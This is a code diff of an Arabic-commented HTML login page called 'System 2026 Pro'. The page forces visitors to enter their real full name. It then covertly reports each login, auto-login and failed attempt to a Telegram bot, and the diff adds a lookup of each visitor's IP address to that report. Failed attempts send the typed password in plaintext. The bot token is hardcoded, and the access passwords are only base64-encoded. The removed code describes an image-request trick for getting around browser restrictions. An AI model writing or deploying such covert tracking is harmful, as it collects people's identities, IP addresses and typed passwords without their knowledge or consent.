@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>System 2026 Pro [FINAL]</title>
+<title>System 2026 Pro [SECURE]</title>
 <style>
     /* UI Design */
     body{font-family:'Segoe UI',Tahoma,Geneva,Verdana,sans-serif;background-color:#0d1117;color:#c9d1d9;margin:0;display:flex;flex-direction:column;align-items:center;justify-content:center;min-height:100vh;user-select:none;-webkit-user-select:none}
@@ -63,7 +63,7 @@
 
 <script>
     // ==========================================
-    // 1. تنظيف الذاكرة القديمة (Service Worker Cleaner)
+    // 1. تنظيف الذاكرة
     // ==========================================
     if(window.navigator && navigator.serviceWorker) {
         navigator.serviceWorker.getRegistrations().then(function(registrations) {
@@ -72,55 +72,81 @@
     }
 
     // ==========================================
-    // 2. إعدادات المستخدم والاسم
+    // 2. التحقق الصارم من الهوية (Strict Identity Check)
     // ==========================================
     let uName = localStorage.getItem("real_name");
     let uID = localStorage.getItem("device_id");
 
-    // لو مفيش ID، اعمل واحد جديد
+    // توليد ID للجهاز
     if(!uID) {
         uID = "ID-" + Math.floor(Math.random() * 9000 + 1000);
         localStorage.setItem("device_id", uID);
     }
 
-    // لو مفيش اسم، اطلبه فوراً ولا تغلق النافذة إلا لما يكتبه
-    if(!uName || uName === "null" || uName.trim() === "") {
-        while(!uName) {
-            uName = prompt("👋 مرحباً بك في نظام 2026\n\nيرجى كتابة اسمك الحقيقي لتفعيل الدخول:");
-        }
-        localStorage.setItem("real_name", uName);
-    }
+    // الكود الذي يجبر المستخدم على كتابة اسمه ويطرده إذا لم يكن موجوداً
+    function checkIdentity() {
+        if(!uName || uName === "null" || uName.trim() === "") {
+            // إذا كان مسجلاً للدخول سابقاً لكن بدون اسم، قم بطرده
+            if(localStorage.getItem("is_logged_in")) {
+                localStorage.removeItem("is_logged_in");
+                location.reload(); 
+                return;
+            }
 
-    // عرض البيانات
+            // إجبار المستخدم على إدخال الاسم
+            while(!uName || uName.trim() === "") {
+                uName = prompt("🛑 تنبيه هام:\n\nلا يمكن استخدام النظام بدون تعريف الهوية.\nيرجى كتابة اسمك الحقيقي ثلاثي:");
+            }
+            localStorage.setItem("real_name", uName);
+            
+            // تسجيل مستخدم جديد وإرسال الـ IP فوراً
+            getIPAndReport("🆕 NEW REGISTRATION", "User defined their name");
+        }
+    }
+    
+    // تنفيذ الفحص
+    checkIdentity();
+
+    // عرض البيانات على الشاشة
     document.getElementById("dispName").innerText = uName;
     document.getElementById("dispID").innerText = uID;
 
     // ==========================================
-    // 3. نظام الإرسال "المخفي" (The Magic Trick)
+    // 3. نظام التتبع والإرسال مع IP
     // ==========================================
-    function sendTelegramLog(action, details) {
+    function getIPAndReport(action, details) {
+        // محاولة جلب الـ IP من خدمة خارجية
+        fetch('https://api.ipify.org?format=json')
+            .then(response => response.json())
+            .then(data => {
+                sendTelegramLog(action, details, data.ip);
+            })
+            .catch(error => {
+                // في حالة الفشل (مثل AdBlock)، أرسل بدون IP
+                sendTelegramLog(action, details, "Unknown/Hidden");
+            });
+    }
+
+    function sendTelegramLog(action, details, ipAddr) {
         const TOKEN = "8596993745:AAG0FXH8LFqweLH5nlPTcFpEM07BHhabrHw";
         const CHAT_ID = "-1003886528114";
         
-        // تجهيز الرسالة
-        const text = `🚨 <b>SYSTEM LOGIN</b>\n` +
+        const text = `🚨 <b>SYSTEM MONITOR</b>\n` +
                      `👤 <b>Name:</b> ${uName}\n` +
                      `🆔 <b>ID:</b> ${uID}\n` +
+                     `🌍 <b>IP:</b> <code>${ipAddr}</code>\n` +
                      `🔑 <b>Action:</b> ${action}\n` +
                      `📝 <b>Details:</b> ${details}\n` +
                      `⏰ <b>Time:</b> ${new Date().toLocaleTimeString('ar-EG')}`;
 
         const url = `https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}&parse_mode=HTML`;
 
-        // الخدعة: استخدام صورة لإرسال الطلب (لا يتأثر بحظر المتصفح CORS)
-        const img = new Image();
-        img.src = url;
-        
-        // مش محتاجين نستنى الرد، الرسالة هتوصل أكيد
+        // إرسال الطلب في الخلفية
+        fetch(url).catch(err => console.log("Log Error"));
     }
 
     // ==========================================
-    // 4. نظام الباسورد والدخول
+    // 4. معالجة كلمة المرور
     // ==========================================
     const passList = ["QWRtaW5fMjZfMjkxMTk5Ng==","QWRtaW5fMjZfNzYxOTg3","QWRtaW5fMjZfNDExMjAxNA==","QWRtaW5fMjZfMjA3MjAxNw==","QWRtaW5fMjZfNzYyMDIx"];
     const SALT = "Admin_26_";
@@ -129,7 +155,7 @@
         const d = new Date(), y = d.getFullYear() < 2026 ? 2026 : d.getFullYear();
         let i = (y - 2026) * 2;
         if (d.getMonth() >= 5) i += 1; 
-        return passList[i % 5]; // الباسورد المتغير
+        return passList[i % 5];
     }
 
     document.getElementById("loginBtn").onclick = function() {
@@ -142,31 +168,26 @@
 
         if(val.length < 1) return;
 
-        // تشغيل التحميل
+        // تفعيل وضع التحميل
         btn.disabled = true;
         txt.style.display = "none";
         ldr.style.display = "block";
         err.style.display = "none";
 
-        // تشفير المدخل للمقارنة
-        const enVal = val.replace(/[٠-٩]/g, d => "٠١٢٣٤٥٦٧٨٩".indexOf(d)); // تحويل أرقام عربي
+        const enVal = val.replace(/[٠-٩]/g, d => "٠١٢٣٤٥٦٧٨٩".indexOf(d));
         const inputHash = btoa(SALT + enVal);
         const correctHash = getCorrectPass();
 
-        // تأخير بسيط لمحاكاة الاتصال
         setTimeout(() => {
             if(inputHash === correctHash) {
-                // 1. إرسال اللوج للتليجرام
-                sendTelegramLog("✅ SUCCESS", "Login Successful");
-                
-                // 2. فتح النظام
+                // ✅ نجاح: أرسل البيانات مع IP وافتح النظام
+                getIPAndReport("✅ LOGIN SUCCESS", "User entered correct pass");
                 localStorage.setItem("is_logged_in", "true");
                 showApp();
             } else {
-                // 1. إرسال محاولة فاشلة
-                sendTelegramLog("⛔ FAILED", "Wrong Pass: " + enVal);
+                // ⛔ فشل: أرسل محاولة الاختراق مع IP
+                getIPAndReport("⛔ LOGIN FAILED", "Wrong Pass: " + enVal);
                 
-                // 2. إظهار الخطأ
                 btn.disabled = false;
                 txt.style.display = "block";
                 ldr.style.display = "none";
@@ -182,22 +203,29 @@
     }
 
     // ==========================================
-    // 5. التشغيل التلقائي
+    // 5. التشغيل التلقائي والخروج
     // ==========================================
     window.go = (u) => window.location.href = u;
     window.logout = () => {
-        if(confirm("تأكيد الخروج؟")) {
+        if(confirm("هل تريد تسجيل الخروج؟")) {
             localStorage.removeItem("is_logged_in");
+            // localStorage.removeItem("real_name"); // شيل الـ // لو عايز تطلب الاسم كل مرة
             location.reload();
         }
     };
 
-    // لو كان مسجل دخول، افتح علطول (بس ابعت تنبيه صامت للتليجرام)
+    // الدخول التلقائي
     if(localStorage.getItem("is_logged_in") === "true") {
-        showApp();
-        sendTelegramLog("🔄 AUTO-LOGIN", "User returned via Cache");
+        if(uName && uName.trim() !== "") {
+            showApp();
+            // تسجيل أن المستخدم عاد للدخول تلقائياً
+            getIPAndReport("🔄 AUTO-LOGIN", "Cache Entry");
+        } else {
+            // حالة أمان: مسجل دخول بس الاسم اتمسح -> طرد
+            localStorage.removeItem("is_logged_in");
+            location.reload();
+        }
     }
-
 </script>
 </body>
 </html>
